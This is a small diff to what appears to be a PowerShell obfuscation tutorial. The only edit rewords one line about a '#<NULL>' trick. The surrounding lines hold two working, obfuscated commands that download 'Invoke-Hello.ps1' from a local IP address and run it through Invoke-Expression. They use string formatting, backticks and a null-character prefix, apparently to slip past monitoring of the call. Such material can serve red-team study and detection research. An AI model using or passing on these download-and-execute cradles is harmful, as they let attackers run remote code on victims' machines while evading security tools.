@@ -763,7 +763,7 @@ Here we can view the all process of encoding/decoding in powershell console
 
        powershell Invoke-Expression('if(0){{{0}}}' -f $(0 -as [char]) + New-Object Net.WebClient').DownloadString('http://192.168.1.71/Invoke-Hello.ps1')
 
-- OR (using #<NULL> before the monitorized syscall)
+- OR (using [#<NULL>] before the monitorized syscall)
 
       powershell Write-Host "#<NULL>"; I`E`X ('({0}w-Object {0}t.WebC{3}nt).{1}String("{2}19`2.16`8.1`.7`1/In`vok`e-He`ll`o.ps`1")' -f'Ne','Download','http://','lie')
 
